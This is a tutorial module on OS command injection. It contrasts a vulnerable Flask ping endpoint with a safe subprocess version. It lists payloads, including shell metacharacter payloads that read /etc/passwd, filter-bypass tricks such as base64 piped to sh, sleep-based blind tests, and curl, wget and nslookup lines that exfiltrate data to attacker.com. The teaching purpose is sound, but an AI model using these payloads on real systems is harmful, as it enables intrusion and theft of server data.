Module 14 — Command Injection

Learn how unsanitized input passed to OS commands enables attackers to execute arbitrary system commands.

Direct Access to the Operating System

SQL injection gives you the database. XSS gives you the user's browser. But command injection? Command injection gives you the entire server. When an application passes user input to an operating system shell without proper sanitization, the attacker can execute any command the web server's user account can run.

Think about what that means. The attacker can read any file on the server. They can list processes. They can download and run malware. They can create new user accounts. They can pivot to other machines on the internal network. They can install a reverse shell and maintain persistent access long after the vulnerability is patched.

Command injection is one of the most severe vulnerability classes because there is no sandbox. SQL injection is limited to what SQL can do. XSS is limited to what JavaScript in a browser can do. Command injection is limited to what the operating system can do — which is everything.

How Command Injection Works

The vulnerability exists whenever an application takes user input and includes it in a string that gets executed as a shell command. The most common scenario is network tools — developers build a web interface for ping, nslookup, traceroute, or similar utilities and pass the user's input directly to the shell.

Vulnerable Code

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # DANGEROUS: user input directly in shell command
    output = os.popen(f'ping -c 1 {host}').read()
    return output

# Normal use: host=8.8.8.8
# Command: ping -c 1 8.8.8.8  (works fine)

# Attack:   host=8.8.8.8; cat /etc/passwd
# Command:  ping -c 1 8.8.8.8; cat /etc/passwd
# The semicolon ends the ping command and starts a new one!

The fundamental issue is the same as SQL injection: the shell receives one string and cannot tell where the developer's command ends and the user's input begins. The semicolon is interpreted as a command separator, and everything after it runs as a separate command.

Shell Metacharacters — The Attacker's Toolkit

The Unix shell has many special characters that control command execution. Each one is a potential injection vector:

CharacterMeaningExample
;Command separator — runs both commandsping 8.8.8.8; cat /etc/passwd
|Pipe — sends output of first to secondping 8.8.8.8 | cat /etc/passwd
&&AND — runs second only if first succeedsping 8.8.8.8 && cat /etc/passwd
||OR — runs second only if first failsping invalid || cat /etc/passwd
`cmd`Backtick substitution — executes inlineping `whoami`.attacker.com
$(cmd)Dollar substitution — same as backticksping $(whoami).attacker.com
%0aURL-encoded newline — starts new linehost=8.8.8.8%0acat+/etc/passwd
> / >>Redirect output to file; id > /app/static/pwned.txt
Windows vs. Linux: On Windows, the metacharacters are slightly different. Use & instead of ; as a command separator, and | works the same way. Windows-specific payloads: & dir, | type C:\windows\win.ini, & whoami.

Safe Code — No Shell Needed

import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # SAFE: pass as a list — no shell interpretation
    # Each element is treated as a separate argument, not parsed by the shell
    result = subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True, text=True, timeout=5
    )
    return result.stdout

The key difference: when you pass a list to subprocess.run() without shell=True, the arguments are passed directly to the ping executable. No shell is involved, so shell metacharacters have no special meaning. Even if the user sends 8.8.8.8; cat /etc/passwd, it is treated as a literal hostname (which will fail to resolve, but will not execute cat).

Filter Bypass Techniques

Many developers try to defend against command injection by blocking specific characters like spaces, semicolons, or pipe characters. These filters are almost always bypassable. The shell is an incredibly expressive language with dozens of ways to accomplish the same thing: 

# === SPACE BYPASS ===
# $IFS (Internal Field Separator) — default includes space, tab, newline
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Brace expansion — commas act as separators
{cat,/etc/passwd}

# Tab character (hex 0x09)
cat%09/etc/passwd

# === KEYWORD BYPASS ===
# Quote insertion — breaks up blocked words
c''at /etc/passwd
c\at /etc/passwd
ca$()t /etc/passwd

# Variable concatenation
a=c;b=at;$a$b /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# Hex encoding
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# Wildcard globbing
cat /etc/pass??
cat /etc/p*wd
The Lesson: Blocklisting shell characters is a losing game. There are too many ways to bypass any filter. The only reliable defense is to avoid using the shell entirely — pass arguments as a list to subprocess.run() without shell=True. If you absolutely must use the shell, use shlex.quote() in Python to properly escape the input.

Blind Command Injection

Sometimes the application executes your command but does not display the output. The server might just show "Ping complete" or return a generic success message. You cannot see the command's output, but you can still confirm injection and extract data through side channels:

Time-Based Detection

# If the response takes 5 extra seconds, injection worked
; sleep 5
| sleep 5
`sleep 5`

Out-of-Band (OOB) Data Exfiltration

# DNS exfiltration — the data appears in your DNS logs
; nslookup $(whoami).your-collaborator-domain.com
; host $(cat /etc/hostname).your-server.com

# HTTP exfiltration — the data arrives as a request to your server
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
; wget http://attacker.com/$(whoami)

File Write Exfiltration

# Write output to a publicly accessible file
; cat /app/secret.txt > /app/static/output.txt
# Then browse to http://target.com/static/output.txt
Burp Collaborator / Interactsh: In real-world pentesting, OOB detection is made easy by tools like Burp Collaborator (built into Burp Suite Pro) or the open-source Interactsh. These tools give you a unique domain name and notify you instantly when any DNS or HTTP request arrives. This makes blind command injection detection reliable and fast.
Impact: Command injection gives attackers full OS-level access — they can read files, install backdoors, create reverse shells, pivot to internal networks, exfiltrate databases, mine cryptocurrency, or wipe the server entirely. It is consistently rated as Critical severity in bug bounty programs.
